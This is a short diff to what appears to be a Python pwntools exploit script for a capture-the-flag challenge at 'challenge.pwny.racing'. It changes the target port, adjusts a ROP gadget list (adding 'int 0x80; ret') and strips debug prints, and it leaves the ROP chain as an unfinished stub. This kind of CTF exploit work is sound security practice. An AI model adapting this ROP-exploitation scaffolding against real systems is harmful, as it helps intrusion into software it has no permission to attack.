@@ -5,7 +5,7 @@ import pickle
 import sys
 
 HOST = 'challenge.pwny.racing'
-PORT = 11543
+PORT = 11542
 
 if len(sys.argv) > 1:
     HOST  = sys.argv[1]
@@ -202,7 +202,7 @@ gadgets = [
     { 'opcode': '\x58\xc3',     'mnemonic': 'pop eax; ret',            'addr': 0 },
     { 'opcode': '\x59\x5b\xc3', 'mnemonic': 'pop ecx ; pop ebx ; ret', 'addr': 0 },
     { 'opcode': '\x5a\xc3',     'mnemonic': 'pop edx; ret',            'addr': 0 },
-    { 'opcode': '\xcd\x80',     'mnemonic': 'int 0x80',                'addr': 0 },
+    { 'opcode': '\xcd\x80\xc3', 'mnemonic': 'int 0x80; ret',           'addr': 0 },
 ]
 
 found = 0
@@ -213,18 +213,14 @@ for gadget in gadgets:
         found += 1
 
 if len(gadgets) != found:
-	print repr(gadgets)
 	log.error('could not find all gadgets')
-	print repr(gadgets)
-	sys.exit(-1)
+
 
 for gadget in gadgets:
 	log.info('gadget: %s => 0x%08x' % (gadget['mnemonic'], gadget['addr']))
 
 # build the rop chain
 #rop  = p32()
-
-print repr(gadgets)
 
 sys.exit(0)
 io.interactive()
